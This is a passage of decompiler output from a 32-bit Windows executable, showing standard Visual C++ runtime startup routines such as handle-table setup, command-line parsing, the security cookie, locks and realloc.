  HANDLE *ppvVar6;
  int iVar7;
  _STARTUPINFOW local_78;
  int local_34;
  uint local_30;
  HANDLE *local_2c;
  HANDLE *local_28;
  HANDLE *local_24;
  HANDLE local_20;
  undefined local_14 [8];
  undefined4 uStack12;
  undefined *local_8;
  
  local_8 = &DAT_004325f0;
  uStack12 = 0x418ad5;
  __lock(0xb);
  local_8 = (undefined *)0x0;
  local_28 = (HANDLE *)FUN_0041770d(0x20,0x40);
  if (local_28 == (HANDLE *)0x0) {
    func_0x0041a970(&DAT_00435980,local_14,0xfffffffe);
    uVar3 = 0xffffffff;
  }
  else {
    DAT_00439924 = (HANDLE)0x20;
    DAT_00436a38 = local_28;
    for (; local_28 < DAT_00436a38 + 0x200; local_28 = local_28 + 0x10) {
      *(undefined2 *)(local_28 + 1) = 0xa00;
      *local_28 = (HANDLE)0xffffffff;
      local_28[2] = (HANDLE)0x0;
      *(byte *)(local_28 + 9) = *(byte *)(local_28 + 9) & 0x80;
      *(byte *)(local_28 + 9) = *(byte *)(local_28 + 9) & 0x7f;
      *(undefined2 *)((int)local_28 + 0x25) = 0xa0a;
      local_28[0xe] = (HANDLE)0x0;
      *(undefined *)(local_28 + 0xd) = 0;
    }
    GetStartupInfoW(&local_78);
    if ((local_78.cbReserved2 != 0) && ((HANDLE *)local_78.lpReserved2 != (HANDLE *)0x0)) {
      local_20 = *(HANDLE *)local_78.lpReserved2;
      local_2c = (HANDLE *)((int)local_78.lpReserved2 + 4);
      local_24 = (HANDLE *)((int)local_2c + (int)local_20);
      if (0x7ff < (int)local_20) {
        local_20 = (HANDLE)0x800;
      }
      local_34 = 1;
      while (iVar7 = local_34, (int)DAT_00439924 < (int)local_20) {
        local_28 = (HANDLE *)FUN_0041770d(0x20,0x40);
        if (local_28 == (HANDLE *)0x0) {
          local_20 = DAT_00439924;
          break;
        }
        (&DAT_00436a38)[iVar7] = local_28;
        DAT_00439924 = (HANDLE)((int)DAT_00439924 + 0x20);
        for (; local_28 < (HANDLE *)((int)(&DAT_00436a38)[iVar7] + 0x800);
            local_28 = local_28 + 0x10) {
          *(undefined2 *)(local_28 + 1) = 0xa00;
          *local_28 = (HANDLE)0xffffffff;
          local_28[2] = (HANDLE)0x0;
          *(byte *)(local_28 + 9) = *(byte *)(local_28 + 9) & 0x80;
          *(undefined2 *)((int)local_28 + 0x25) = 0xa0a;
          local_28[0xe] = (HANDLE)0x0;
          *(undefined *)(local_28 + 0xd) = 0;
        }
        local_34 = iVar7 + 1;
      }
      local_30 = 0;
      pvVar5 = local_20;
      while (uVar1 = local_30, (int)local_30 < (int)pvVar5) {
        hFile = *local_24;
        if ((((hFile != (HANDLE)0xffffffff) && (hFile != (HANDLE)0xfffffffe)) &&
            ((*(byte *)local_2c & 1) != 0)) &&
           (((*(byte *)local_2c & 8) != 0 ||
            (DVar4 = GetFileType(hFile), pvVar5 = local_20, DVar4 != 0)))) {
          ppvVar6 = (HANDLE *)((uVar1 & 0x1f) * 0x40 + (int)(&DAT_00436a38)[(int)uVar1 >> 5]);
          *ppvVar6 = *local_24;
          *(byte *)(ppvVar6 + 1) = *(byte *)local_2c;
          local_28 = ppvVar6;
          FUN_004194dd((LPCRITICAL_SECTION)(ppvVar6 + 3),4000,0);
          ppvVar6[2] = (HANDLE)((int)ppvVar6[2] + 1);
          pvVar5 = local_20;
        }
        local_2c = (HANDLE *)((int)local_2c + 1);
        local_24 = local_24 + 1;
        local_30 = uVar1 + 1;
      }
    }
    for (iVar7 = 0; local_30 = iVar7, iVar7 < 3; iVar7 = iVar7 + 1) {
      ppvVar6 = DAT_00436a38 + iVar7 * 0x10;
      local_28 = ppvVar6;
      if ((*ppvVar6 == (HANDLE)0xffffffff) || (*ppvVar6 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar6 + 1) = 0x81;
        if (iVar7 == 0) {
          DVar4 = 0xfffffff6;
        }
        else {
          DVar4 = 0xfffffff5 - (iVar7 != 1);
        }
        local_20 = GetStdHandle(DVar4);
        if (((local_20 == (HANDLE)0xffffffff) || (local_20 == (HANDLE)0x0)) ||
           (DVar4 = GetFileType(local_20), DVar4 == 0)) {
          *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 0x40;
          *ppvVar6 = (HANDLE)0xfffffffe;
          if (DAT_00439880 != 0) {
            *(undefined4 *)(*(int *)(DAT_00439880 + iVar7 * 4) + 0x10) = 0xfffffffe;
          }
        }
        else {
          *ppvVar6 = local_20;
          if ((DVar4 & 0xff) == 2) {
            bVar2 = *(byte *)(ppvVar6 + 1) | 0x40;
LAB_00418d29:
            *(byte *)(ppvVar6 + 1) = bVar2;
          }
          else if ((DVar4 & 0xff) == 3) {
            bVar2 = *(byte *)(ppvVar6 + 1) | 8;
            goto LAB_00418d29;
          }
          FUN_004194dd((LPCRITICAL_SECTION)(ppvVar6 + 3),4000,0);
          ppvVar6[2] = (HANDLE)((int)ppvVar6[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 0x80;
      }
    }
    local_8 = (undefined *)0xfffffffe;
    FUN_00418d74();
    uVar3 = 0;
  }
  return uVar3;
}



void FUN_00418d74(void)

{
  FUN_00419c57(0xb);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00418d7d(void)

{
  uint uVar1;
  uint uVar2;
  short **ppsVar3;
  short *psVar4;
  uint local_c;
  uint local_8;
  
  _DAT_00436d40 = 0;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_00436b38,0x104);
  _DAT_00436a0c = &DAT_00436b38;
  if ((DAT_0043993c == (short *)0x0) || (psVar4 = DAT_0043993c, *DAT_0043993c == 0)) {
    psVar4 = (short *)&DAT_00436b38;
  }
  FUN_00418e2b(psVar4,(short **)0x0,(short *)0x0,(int *)&local_8,(int *)&local_c);
  uVar2 = local_8;
  if ((((local_8 < 0x3fffffff) && (local_c < 0x7fffffff)) &&
      (uVar1 = (local_c + local_8 * 2) * 2, local_c * 2 <= uVar1)) &&
     (ppsVar3 = (short **)FUN_00417755(uVar1), ppsVar3 != (short **)0x0)) {
    FUN_00418e2b(psVar4,ppsVar3,(short *)(ppsVar3 + uVar2),(int *)&local_8,(int *)&local_c);
    _DAT_004369f4 = local_8 - 1;
    _DAT_004369fc = ppsVar3;
    return 0;
  }
  return 0xffffffff;
}



void __cdecl FUN_00418e2b(short *param_1,short **param_2,short *param_3,int *param_4,int *param_5)

{
  bool bVar1;
  bool bVar2;
  short sVar3;
  uint uVar4;
  
  bVar1 = false;
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (short **)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  do {
    if (*param_1 == 0x22) {
      bVar1 = !bVar1;
      sVar3 = 0x22;
    }
    else {
      *param_5 = *param_5 + 1;
      if (param_3 != (short *)0x0) {
        *param_3 = *param_1;
        param_3 = param_3 + 1;
      }
      sVar3 = *param_1;
      if (sVar3 == 0) goto LAB_00418eb8;
    }
    param_1 = param_1 + 1;
  } while ((bVar1) || ((sVar3 != 0x20 && (sVar3 != 9))));
  if (param_3 != (short *)0x0) {
    param_3[-1] = 0;
  }
LAB_00418eb8:
  bVar1 = false;
  while (*param_1 != 0) {
    for (; (*param_1 == 0x20 || (*param_1 == 9)); param_1 = param_1 + 1) {
    }
    if (*param_1 == 0) break;
    if (param_2 != (short **)0x0) {
      *param_2 = param_3;
      param_2 = param_2 + 1;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      uVar4 = 0;
      bVar2 = true;
      for (; *param_1 == 0x5c; param_1 = param_1 + 1) {
        uVar4 = uVar4 + 1;
      }
      if (*param_1 == 0x22) {
        if ((uVar4 & 1) == 0) {
          if ((bVar1) && (param_1[1] == 0x22)) {
            param_1 = param_1 + 1;
          }
          else {
            bVar2 = false;
            bVar1 = !bVar1;
          }
        }
        uVar4 = uVar4 >> 1;
      }
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        if (param_3 != (short *)0x0) {
          *param_3 = 0x5c;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      sVar3 = *param_1;
      if ((sVar3 == 0) || ((!bVar1 && ((sVar3 == 0x20 || (sVar3 == 9)))))) break;
      if (bVar2) {
        if (param_3 != (short *)0x0) {
          *param_3 = sVar3;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      param_1 = param_1 + 1;
    }
    if (param_3 != (short *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (param_2 != (short **)0x0) {
    *param_2 = (short *)0x0;
  }
  *param_4 = *param_4 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __fastcall FUN_00418fba(undefined4 param_1,undefined2 param_2)

{
  short *psVar1;
  short sVar2;
  int *piVar3;
  undefined2 extraout_DX;
  undefined2 uVar4;
  int iVar5;
  undefined6 uVar6;
  short *psVar7;
  short *psVar8;
  
  iVar5 = 0;
  psVar7 = DAT_004369e0;
  if (DAT_004369e0 != (short *)0x0) {
    for (; *psVar7 != 0; psVar7 = psVar7 + (int)uVar6 + 1) {
      if (*psVar7 != 0x3d) {
        iVar5 = iVar5 + 1;
      }
      uVar6 = FUN_0041c12a(0x3d,param_2);
      param_2 = (undefined2)((uint6)uVar6 >> 0x20);
    }
    psVar7 = (short *)&DAT_00000004;
    piVar3 = (int *)FUN_0041770d(iVar5 + 1,4);
    DAT_00436a04 = piVar3;
    if (piVar3 != (int *)0x0) {
      sVar2 = *DAT_004369e0;
      uVar4 = extraout_DX;
      psVar1 = DAT_004369e0;
      while( true ) {
        if (sVar2 == 0) {
          FID_conflict__free(DAT_004369e0);
          DAT_004369e0 = (short *)0x0;
          *piVar3 = 0;
          _DAT_00439938 = 1;
          return 0;
        }
        psVar8 = psVar1;
        uVar6 = FUN_0041c12a(psVar7,uVar4);
        uVar4 = (undefined2)((uint6)uVar6 >> 0x20);
        iVar5 = (int)uVar6 + 1;
        if (*psVar1 != 0x3d) break;
        psVar1 = psVar1 + iVar5;
        sVar2 = *psVar1;
        psVar7 = psVar8;
      }
      iVar5 = FUN_0041770d(iVar5,2);
      *piVar3 = iVar5;
      if (iVar5 == 0) {
        FID_conflict__free(DAT_00436a04);
        DAT_00436a04 = (int *)0x0;
        return 0xffffffff;
      }
                    // WARNING: Subroutine does not return
      __break();
    }
  }
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2012 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (_DAT_00436d48 != 1) {
      return;
    }
  }
  FUN_004190f9(0xfc);
  FUN_004190f9(0xff);
  return;
}



// Library Function - Single Match
//  __GET_RTERRMSG
// 
// Library: Visual Studio 2012 Release

wchar_t * __cdecl __GET_RTERRMSG(int param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00428748)[uVar1 * 2]) {
      return (wchar_t *)(&PTR_u_R6002___floating_point_support_n_0042874c)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x17);
  return (wchar_t *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 __cdecl FUN_004190f9(int param_1)

{
  wchar_t *pwVar1;
  int iVar2;
  HANDLE hFile;
  size_t nNumberOfBytesToWrite;
  uint uVar3;
  undefined8 uVar4;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_200;
  char local_1fc [500];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  pwVar1 = __GET_RTERRMSG(param_1);
  if (pwVar1 != (wchar_t *)0x0) {
    iVar2 = __set_error_mode(3);
    if ((iVar2 == 1) || ((iVar2 = __set_error_mode(3), iVar2 == 0 && (_DAT_00436d48 == 1)))) {
      hFile = GetStdHandle(0xfffffff4);
      if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
        uVar3 = 0;
        do {
          local_1fc[uVar3] = *(char *)(pwVar1 + uVar3);
          if (pwVar1[uVar3] == L'\0') break;
          uVar3 = uVar3 + 1;
        } while (uVar3 < 500);
        lpOverlapped = (LPOVERLAPPED)0x0;
        lpNumberOfBytesWritten = &local_200;
        local_1fc[499] = 0;
        nNumberOfBytesToWrite = _strlen(local_1fc);
        WriteFile(hFile,local_1fc,nNumberOfBytesToWrite,lpNumberOfBytesWritten,lpOverlapped);
      }
    }
    else if (param_1 != 0xfc) {
                    // WARNING: Subroutine does not return
      __break();
    }
  }
  uVar4 = FUN_0041a954();
  return uVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_004192b6(undefined4 param_1)

{
  _DAT_00436d48 = param_1;
  return;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2012 Release

int __cdecl __set_error_mode(int _Mode)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = DAT_00437378;
  if (_Mode < 0) {
LAB_004192ee:
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_00419a8d();
    return -1;
  }
  if (_Mode < 3) {
    DAT_00437378 = _Mode;
  }
  else if (_Mode != 3) goto LAB_004192ee;
  return iVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2015 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  uint local_18;
  uint local_14;
  _FILETIME local_10;
  uint local_8;
  
  local_10.dwLowDateTime = 0;
  local_10.dwHighDateTime = 0;
  if ((DAT_00435980 == 0xbb40e64e) || ((DAT_00435980 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_10);
    local_8 = local_10.dwHighDateTime ^ local_10.dwLowDateTime;
    DVar1 = GetCurrentThreadId();
    local_8 = local_8 ^ DVar1;
    DVar1 = GetCurrentProcessId();
    local_8 = local_8 ^ DVar1;
    QueryPerformanceCounter((LARGE_INTEGER *)&local_18);
    DAT_00435980 = local_14 ^ local_18 ^ local_8 ^ (uint)&local_8;
    if (DAT_00435980 == 0xbb40e64e) {
      DAT_00435980 = 0xbb40e64f;
    }
    else if ((DAT_00435980 & 0xffff0000) == 0) {
      DAT_00435980 = DAT_00435980 | (DAT_00435980 | 0x4711) << 0x10;
    }
    _DAT_00435984 = ~DAT_00435980;
  }
  else {
    _DAT_00435984 = ~DAT_00435980;
  }
  return;
}



void FUN_0041939f(void)

{
  code **ppcVar1;
  
  for (ppcVar1 = (code **)&DAT_004323c0; ppcVar1 < &DAT_004323c0; ppcVar1 = ppcVar1 + 1) {
    if (*ppcVar1 != (code *)0x0) {
      (**ppcVar1)();
    }
  }
  return;
}



LPWCH FUN_004193df(void)

{
  WCHAR WVar1;
  LPWCH _Src;
  LPWCH _Dst;
  LPWCH pWVar2;
  WCHAR *pWVar3;
  size_t _Size;
  WCHAR *pWVar4;
  
  _Src = GetEnvironmentStringsW();
  pWVar2 = _Src;
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar3 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar4 = pWVar3;
        pWVar3 = pWVar4 + 1;
      } while (*pWVar3 != L'\0');
      pWVar3 = pWVar4 + 2;
      WVar1 = *pWVar3;
    }
    _Size = (int)pWVar3 + (2 - (int)_Src);
    _Dst = (LPWCH)FUN_00417755(_Size);
    pWVar2 = (LPWCH)0x0;
    if (_Dst != (LPWCH)0x0) {
      FID_conflict__memcpy(_Dst,_Src,_Size);
      pWVar2 = _Dst;
    }
    FreeEnvironmentStringsW(_Src);
  }
  return pWVar2;
}



void __cdecl FUN_0041943c(undefined4 param_1)

{
  if ((code *)(DAT_004398a0 ^ DAT_00435980) != (code *)0x0) {
    (*(code *)(DAT_004398a0 ^ DAT_00435980))(param_1);
    return;
  }
                    // WARNING: Could not recover jumptable at 0x00419454. Too many branches
                    // WARNING: Treating indirect jump as call
  TlsAlloc();
  return;
}



void __cdecl FUN_0041945a(DWORD param_1)

{
  if ((code *)(DAT_004398a4 ^ DAT_00435980) != (code *)0x0) {
    (*(code *)(DAT_004398a4 ^ DAT_00435980))();
    return;
  }
  TlsFree(param_1);
  return;
}



void __cdecl FUN_00419479(DWORD param_1)

{
  if ((code *)(DAT_004398a8 ^ DAT_00435980) != (code *)0x0) {
    (*(code *)(DAT_004398a8 ^ DAT_00435980))();
    return;
  }
  TlsGetValue(param_1);
  return;
}



void __cdecl FUN_00419498(DWORD param_1,LPVOID param_2)

{
  if ((code *)(DAT_004398ac ^ DAT_00435980) != (code *)0x0) {
    (*(code *)(DAT_004398ac ^ DAT_00435980))();
    return;
  }
  TlsSetValue(param_1,param_2);
  return;
}



WORD FUN_004194ba(void)

{
  undefined local_48 [48];
  WORD local_18;
  
  GetStartupInfoW((LPSTARTUPINFOW)local_48);
  if ((local_48[44] & 1) == 0) {
    local_18 = 10;
  }
  return local_18;
}



undefined4 __cdecl FUN_004194dd(LPCRITICAL_SECTION param_1,DWORD param_2,undefined4 param_3)

{
  undefined4 uVar1;
  
  if ((code *)(DAT_004398b0 ^ DAT_00435980) != (code *)0x0) {
    uVar1 = (*(code *)(DAT_004398b0 ^ DAT_00435980))(param_1,param_2,param_3);
    return uVar1;
  }
  InitializeCriticalSectionAndSpinCount(param_1,param_2);
  return 1;
}



bool FUN_0041950b(void)

{
  int iVar1;
  int iVar2;
  undefined4 local_8;
  
  iVar1 = DAT_00435310;
  if (DAT_00435310 < 0) {
    local_8 = 0;
    iVar1 = 0;
    if (((code *)(DAT_00439914 ^ DAT_00435980) != (code *)0x0) &&
       (iVar2 = (*(code *)(DAT_00439914 ^ DAT_00435980))(&local_8,0), iVar2 == 0x7a)) {
      iVar1 = 1;
    }
  }
  DAT_00435310 = iVar1;
  return 0 < DAT_00435310;
}



undefined4 __cdecl FUN_004197d6(undefined4 param_1)

{
  undefined4 uVar1;
  
  if ((code *)(DAT_004398bc ^ DAT_00435980) != (code *)0x0) {
    uVar1 = (*(code *)(DAT_004398bc ^ DAT_00435980))(param_1);
    return uVar1;
  }
  return 0;
}



void __cdecl FUN_004197f1(LPTOP_LEVEL_EXCEPTION_FILTER param_1)

{
  SetUnhandledExceptionFilter(param_1);
  return;
}



void __cdecl FUN_004197ff(DWORD param_1)

{
  Sleep(param_1);
  return;
}



// Library Function - Single Match
//  ___crtTerminateProcess
// 
// Library: Visual Studio 2012 Release

void __cdecl ___crtTerminateProcess(UINT uExitCode)

{
  HANDLE hProcess;
  
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



void __cdecl FUN_00419822(_EXCEPTION_POINTERS *param_1)

{
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter(param_1);
  return;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2012 Release

ushort * __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_0043993c;
  if (DAT_0043993c == (ushort *)0x0) {
    puVar3 = &DAT_0042f178;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return puVar3;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return puVar3;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2012 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  LPVOID pvVar2;
  int iVar3;
  int *piVar4;
  DWORD DVar5;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    FID_conflict__free(_Memory);
  }
  else {
    do {
      if (0xffffffe0 < _NewSize) {
        __callnewh(_NewSize);
        piVar4 = __errno();
        *piVar4 = 0xc;
        return (void *)0x0;
      }
      if (_NewSize == 0) {
        _NewSize = 1;
      }
      pvVar2 = HeapReAlloc(DAT_004369ec,0,_Memory,_NewSize);
      if (pvVar2 != (LPVOID)0x0) {
        return pvVar2;
      }
      if (_DAT_00437514 == 0) {
        piVar4 = __errno();
        DVar5 = GetLastError();
        iVar3 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar3;
        return (void *)0x0;
      }
      iVar3 = __callnewh(_NewSize);
    } while (iVar3 != 0);
    piVar4 = __errno();
    DVar5 = GetLastError();
    iVar3 = __get_errno_from_oserr(DVar5);
    *piVar4 = iVar3;
  }
  return (void *)0x0;
}



undefined8 __fastcall FUN_00419930(undefined4 param_1,byte param_2,int param_3)

{
  BOOL BVar1;
  int iVar2;
  byte extraout_DL;
  int unaff_EDI;
  undefined8 uVar3;
  PEXCEPTION_RECORD in_stack_fffffcd4;
  PCONTEXT in_stack_fffffcd8;
  undefined2 in_stack_fffffcdc;
  byte in_stack_fffffce0;
  uint in_stack_fffffce4;
  _EXCEPTION_POINTERS *p_Var4;
  int in_stack_fffffcec;
  undefined4 in_stack_fffffcf0;
  undefined4 in_stack_fffffcf4;
  undefined2 in_stack_fffffcf8;
  byte in_stack_fffffcfc;
  uint in_stack_fffffd00;
  
  if (param_3 != -1) {
    FUN_0041c453(param_1,param_2,param_3,unaff_EDI,in_stack_fffffcd4,in_stack_fffffcd8,
                 in_stack_fffffcdc,in_stack_fffffce0,in_stack_fffffce4);
  }
  FUN_00416e80((uint *)&stack0xfffffce0,0,0x4c);
  BVar1 = IsDebuggerPresent();
  p_Var4 = (_EXCEPTION_POINTERS *)&stack0xfffffcd4;
  iVar2 = FUN_00419822(p_Var4);
  if (((iVar2 == 0) && (BVar1 == 0)) && (param_3 != -1)) {
    FUN_0041c453(p_Var4,extraout_DL,param_3,in_stack_fffffcec,in_stack_fffffcf0,in_stack_fffffcf4,
                 in_stack_fffffcf8,in_stack_fffffcfc,in_stack_fffffd00);
  }
  uVar3 = FUN_0041a954();
  return uVar3;
}



void __cdecl FUN_00419a55(undefined4 param_1)

{
  DAT_0043737c = param_1;
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

void __invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                        uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)DecodePointer(DAT_0043737c);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x00419a76. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
  UNRECOVERED_JUMPTABLE = (code *)swi(3);
  (*UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_00419a8d(void)

{
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2012 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  code *pcVar1;
  int iVar2;
  int in_ECX;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar3;
  byte extraout_DL;
  byte extraout_DL_00;
  byte bVar4;
  undefined2 in_DX;
  
  iVar2 = FUN_00422f06(in_ECX,in_DX);
  uVar3 = extraout_ECX;
  bVar4 = extraout_DL;
  if (iVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)();
    uVar3 = extraout_ECX_00;
    bVar4 = extraout_DL_00;
  }
  FUN_00419930(uVar3,bVar4,2);
  ___crtTerminateProcess(0xc0000417);
  return;
}



PVOID __cdecl FUN_00419ac8(PVOID param_1)

{
  PVOID pvVar1;
  
  pvVar1 = DecodePointer(DAT_0043737c);
  DAT_0043737c = EncodePointer(param_1);
  return pvVar1;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2012 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((&DAT_00435318)[_File * 2] == 0) {
    iVar1 = FUN_00419b75(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_00435318)[_File * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 __cdecl FUN_00419b75(int param_1)

{
  LPCRITICAL_SECTION _Memory;
  int *piVar1;
  
  if (DAT_004369ec == 0) {
    __FF_MSGBANNER();
    FUN_004190f9(0x1e);
    ___crtExitProcess(0xff);
  }
  if ((&DAT_00435318)[param_1 * 2] == 0) {
    _Memory = (LPCRITICAL_SECTION)FUN_00417755(0x18);
    if (_Memory == (LPCRITICAL_SECTION)0x0) {
      piVar1 = __errno();
      *piVar1 = 0xc;
      return 0;
    }
    __lock(10);
    if ((&DAT_00435318)[param_1 * 2] == 0) {
      FUN_004194dd(_Memory,4000,0);
      (&DAT_00435318)[param_1 * 2] = _Memory;
    }
    else {
      FID_conflict__free(_Memory);
    }
    FUN_00419c15();
  }
  return 1;
}



void FUN_00419c15(void)

{
  FUN_00419c57(10);
  return;
}



undefined4 FUN_00419c1e(void)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION p_Var2;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00435318;
  p_Var2 = (LPCRITICAL_SECTION)&DAT_00437380;
  do {
    if (pp_Var1[1] == (LPCRITICAL_SECTION)0x1) {
      *pp_Var1 = p_Var2;
      p_Var2 = p_Var2 + 1;
      FUN_004194dd(*pp_Var1,4000,0);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x435438);
  return 1;
}



void __cdecl FUN_00419c57(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_00435318)[param_1 * 2]);
  return;
}



// Library Function - Single Match
//  __FindPESection
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  uVar3 = 0;
  iVar1 = *(int *)(pImageBase + 0x3c);
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) && (rva < p_Var2->Misc + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2019 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  uint uVar1;
  BOOL BVar2;
  PIMAGE_SECTION_HEADER p_Var3;
  int **in_FS_OFFSET;
  int *local_14;
  code *pcStack16;
  uint local_c;
  undefined4 local_8;
  
  pcStack16 = FUN_00417850;
  local_14 = *in_FS_OFFSET;
  local_c = DAT_00435980 ^ 0x432630;
  *in_FS_OFFSET = (int *)&local_14;
  local_8 = 0;
  BVar2 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar2 != 0) {
    p_Var3 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var3 != (PIMAGE_SECTION_HEADER)0x0) {
      uVar1 = p_Var3->Characteristics;
      *in_FS_OFFSET = local_14;
      return ~(uVar1 >> 0x1f) & 1;
    }
  }
  *in_FS_OFFSET = local_14;
  return 0;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  uint uVar1;
  
  if (*(short *)pImageBase != 0x5a4d) {
    return 0;
  }
  uVar1 = 0;
  if (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550) {
    uVar1 = (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return uVar1;
}



void FUN_00419db1(void)

{
  PVOID pvVar1;
  uint uVar2;
  
  uVar2 = 0;
  do {
    pvVar1 = EncodePointer(*(PVOID *)((int)&DAT_00435438 + uVar2));
    *(PVOID *)((int)&DAT_00435438 + uVar2) = pvVar1;
    uVar2 = uVar2 + 4;
  } while (uVar2 < 0x28);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2012 Release

void __cdecl terminate(void)

{
  code *pcVar1;
  _ptiddata p_Var2;
  
  p_Var2 = __getptd();
